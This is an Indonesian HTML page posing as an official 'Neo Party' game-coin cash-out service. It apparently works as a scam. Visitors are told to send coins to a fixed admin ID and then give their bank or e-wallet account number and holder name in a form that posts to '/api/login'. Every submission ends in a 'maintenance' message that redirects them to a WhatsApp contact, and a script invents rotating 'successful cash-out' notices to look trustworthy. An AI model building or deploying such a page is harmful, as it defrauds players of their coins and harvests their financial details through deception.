<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Bongkar - Neo Party Resmi</title>
    
    <link rel="stylesheet" href="https://maxst.icons8.com/vue-static/landings/line-awesome/line-awesome/1.3.0/css/line-awesome.min.css">
    <link href="https://unpkg.com/boxicons@2.0.9/css/boxicons.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    
    <style>
        :root {
            --primary-bg: #043e3a;
            --accent-teal: #0b5250;
            --gold-gradient: linear-gradient(135deg, #ff9800, #ffcc33);
            --glass-bg: rgba(255, 255, 255, 0.1);
            --text-light: #23e1fd;
            --text-dark: #5a3418;
            --input-bg: #f3d2a2;
        }

        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background: var(--primary-bg);
            color: #fff;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
        }

        .main-container {
            width: 100%;
            max-width: 480px;
            background: var(--primary-bg);
            min-height: 100vh;
            box-shadow: 0 0 50px rgba(0,0,0,0.5);
            padding-bottom: 40px;
        }

        /* Header Style */
        .header-banner {
            background: linear-gradient(to bottom, rgba(11,82,80,0.8), var(--primary-bg)), url('img/bg_top.jpg');
            background-size: cover;
            text-align: center;
            padding: 20px 10px;
            border-bottom: 3px solid var(--text-light);
        }

        .header-banner h1 {
            color: #FFFF33;
            font-size: 22px;
            margin: 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        .promo-img {
            width: 90%;
            border-radius: 15px;
            margin: 15px auto;
            display: block;
            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
            border: 2px solid rgba(255,255,255,0.1);
        }

        /* Action Buttons */
        .nav-links {
            display: flex;
            flex-direction: column;
            gap: 12px;
            padding: 0 20px;
            margin-bottom: 25px;
        }

        .btn-action {
            display: block;
            padding: 14px;
            text-align: center;
            background: var(--gold-gradient);
            color: #000;
            text-decoration: none;
            font-weight: 800;
            border-radius: 12px;
            font-size: 14px;
            box-shadow: 0 4px 15px rgba(255, 152, 0, 0.3);
            transition: 0.3s;
        }

        .btn-action:active { transform: scale(0.97); }

        /* Form Styling */
        .section-card {
            background: var(--accent-teal);
            margin: 15px;
            padding: 20px;
            border-radius: 20px;
            border: 1px solid rgba(255,255,255,0.05);
        }

        .section-title {
            text-align: center;
            font-size: 18px;
            font-weight: bold;
            color: #FFFF33;
            margin-bottom: 15px;
            display: block;
        }

        .pretty-input {
            display: flex;
            align-items: center;
            background: var(--input-bg);
            border-radius: 12px;
            padding: 12px 15px;
            margin-bottom: 15px;
            box-shadow: inset 0 2px 5px rgba(0,0,0,0.1);
        }

        .pretty-input i {
            color: var(--text-dark);
            font-size: 18px;
            margin-right: 12px;
            width: 20px;
            text-align: center;
        }

        .pretty-input input, .pretty-input select {
            border: none;
            background: transparent;
            width: 100%;
            outline: none;
            font-weight: 700;
            color: var(--text-dark);
            font-size: 15px;
        }

        /* ID Display Area */
        .id-display-box {
            text-align: center;
            background: rgba(0,0,0,0.2);
            padding: 15px;
            border-radius: 15px;
            margin-top: 10px;
        }

        .id-image {
            width: 140px;
            height: 140px;
            border-radius: 15px;
            margin-bottom: 15px;
            border: 3px solid #ffcc33;
        }

        .copy-group {
            display: flex;
            background: #f3d2a2;
            border-radius: 10px;
            overflow: hidden;
        }

        .copy-group input {
            flex: 1;
            padding: 10px;
            border: none;
            background: transparent;
            font-weight: bold;
            text-align: center;
            color: #5a3418;
        }

        .btn-copy {
            background: var(--gold-gradient);
            border: none;
            padding: 0 20px;
            font-weight: bold;
            cursor: pointer;
        }

        /* Upload Area */
        .file-input-wrapper {
            background: rgba(255,255,255,0.05);
            border: 2px dashed #ffcc33;
            padding: 15px;
            border-radius: 12px;
            text-align: center;
            margin-bottom: 15px;
        }

        /* Submit Button */
        .btn-submit {
            width: 100%;
            padding: 15px;
            border-radius: 12px;
            border: none;
            background: linear-gradient(0deg, #67a309 0, #c7ee4c 100%);
            color: #1a5806;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer;
            box-shadow: 0 4px 0 #1a5806;
            margin-top: 10px;
        }

        .btn-submit:active {
            transform: translateY(2px);
            box-shadow: 0 2px 0 #1a5806;
        }

        .btn-whatsapp {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
            text-decoration: none;
            color: #fff;
            background: #25D366;
            padding: 12px;
            border-radius: 12px;
            font-weight: bold;
        }

        /* Notifications */
        #notifications-container {
            position: fixed;
            top: 15px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 9999;
            width: 90%;
            max-width: 400px;
        }

        .notification {
            background: linear-gradient(135deg, #1fa866, #0b6b43);
            padding: 12px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.4);
            margin-bottom: 10px;
            animation: slideDown 0.5s ease forwards;
        }

        @keyframes slideDown {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .notif-icon { width: 40px; height: 40px; }
        .notif-text b { display: block; font-size: 14px; }
        .notif-text span { font-size: 12px; opacity: 0.9; }
    </style>
</head>
<body>

    <div id="notifications-container"></div>

    <div class="main-container">
        <div class="header-banner">
            <h1>ADMIN RESMI BONGKAR</h1>
        </div>

        <img src="img/bgcok.png" alt="Promo" class="promo-img">

        <div class="nav-links">
            <a href="https://www.youtube.com/watch?v=n93T7sNPgdI" target="_blank" class="btn-action">
                <i class="fab fa-youtube"></i> TUTORIAL & TESTIMONI CEK DISINI
            </a>
            <a href="http://topup.neoparty.web.id" target="_blank" class="btn-action">
                <i class="fas fa-shopping-cart"></i> TOP UP KOIN KLIK DISINI
            </a>
        </div>

        <form id="bongkarForm">
            <div class="section-card">
                <span class="section-title">INFO PENGIRIM</span>
                
                <div class="pretty-input">
                    <i class="bx bx-id-card"></i>
                    <input type="number" name="id_pengirim" placeholder="Masukkan ID Game Anda" required>
                </div>

                <div class="pretty-input">
                    <i class="bx bx-user"></i>
                    <input type="text" name="nickname" placeholder="Masukkan Nickname" required>
                </div>

                <div class="pretty-input">
                    <i class="bx bx-coin-stack"></i>
                    <input type="text" name="jumlah_bongkaran" placeholder="Jumlah Bongkar (Contoh: 10B)" required>
                </div>
            </div>

            <div class="section-card">
                <span class="section-title">ID TUJUAN PENGIRIMAN</span>
                <div class="id-display-box">
                    <img src="img/id.png" alt="ID Admin" class="id-image">
                    <div class="copy-group">
                        <input type="text" id="idPenerima" value="2448011" readonly>
                        <button type="button" class="btn-copy" onclick="copyID()">SALIN</button>
                    </div>
                    <p style="font-size: 11px; margin-top: 10px; color: #ffcc33;">
                        *Kirim koin ke ID di atas sebelum mengisi form
                    </p>
                </div>
            </div>

            <div class="section-card">
                <span class="section-title">BUKTI & PENCAIRAN</span>
                
                <div class="file-input-wrapper">
                    <label style="font-size: 13px; margin-bottom: 8px; display: block;">Upload Screenshot History</label>
                    <input type="file" name="bukti_transfer" accept="image/*" required>
                </div>

                <div class="pretty-input">
                    <i class="bx bx-landmark"></i>
                    <select name="bank_pencairan" required>
                        <option value="" disabled selected>Pilih Bank / E-Wallet</option>
                        <option>DANA</option>
                        <option>OVO</option>
                        <option>GOPAY</option>
                        <option>BCA</option>
                        <option>BRI</option>
                        <option>BNI</option>
                        <option>MANDIRI</option>
                    </select>
                </div>

                <div class="pretty-input">
                    <i class="bx bx-credit-card"></i>
                    <input type="number" name="nomor_rekening" placeholder="Nomor Rekening / HP" required>
                </div>

                <div class="pretty-input">
                    <i class="bx bx-user-circle"></i>
                    <input type="text" name="atas_nama" placeholder="Atas Nama Pemilik" required>
                </div>

                <button type="submit" class="btn-submit" id="submitBtn">KIRIM FORMULIR</button>
                
                <a href="https://wa.me/6285707732645" class="btn-whatsapp" target="_blank">
                    <i class="fab fa-whatsapp" style="font-size: 24px;"></i>
                    CHAT ADMIN (PROSES CEPAT)
                </a>
            </div>
        </form>
    </div>

    <script>
        // Copy Function
        function copyID() {
            const copyText = document.getElementById("idPenerima");
            copyText.select();
            copyText.setSelectionRange(0, 99999);
            navigator.clipboard.writeText(copyText.value);
            alert("ID Berhasil disalin: " + copyText.value);
        }

        // Form Logic
        document.getElementById("bongkarForm").addEventListener("submit", async function(e) {
            e.preventDefault();
            const btn = document.getElementById("submitBtn");
            btn.innerText = "PROSES...";
            btn.disabled = true;

            const formData = new FormData(this);
            const data = Object.fromEntries(formData.entries());

            try {
                const res = await fetch("/api/login", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });

                const result = await res.json();
                if (result.status === "success") {
                    alert("Sistem Maintenance! Silahkan chat admin untuk mempercepat proses pencairan.");
                    this.reset();
                } else {
                    alert("Gagal mengirim data. Silahkan coba lagi.");
                }
            } catch (err) {
                // Simulasi jika API belum ready
                alert("Pencairan Maintenance ❗️\nSilahkan kirim bukti ke WhatsApp Admin agar segera diproses.");
            } finally {
                btn.innerText = "KIRIM FORMULIR";
                btn.disabled = false;
            }
        });

        // Notifications System (HD)
        const names = ['Poco X3 Pro', 'Siti Aisyah', 'Agus Rahman', 'RMX 7090', 'User_99', 'Infinix User'];
        const amounts = ['5B | Rp. 310.000', '10B | Rp. 620.000', '50B | Rp. 3.100.000', '1B | Rp. 62.000'];

        function showNotif() {
            const container = document.getElementById('notifications-container');
            const name = names[Math.floor(Math.random() * names.length)];
            const amount = amounts[Math.floor(Math.random() * amounts.length)];
            
            const div = document.createElement('div');
            div.className = 'notification';
            div.innerHTML = `
                <img src="img/reg_gold_.png" class="notif-icon">
                <div class="notif-text">
                    <b>${name}</b>
                    <span>Berhasil Bongkar ${amount}</span>
                </div>
            `;
            
            container.appendChild(div);
            setTimeout(() => {
                div.style.opacity = '0';
                setTimeout(() => div.remove(), 500);
            }, 4000);
        }

        setInterval(showNotif, 7000);
    </script>
</body>
</html>
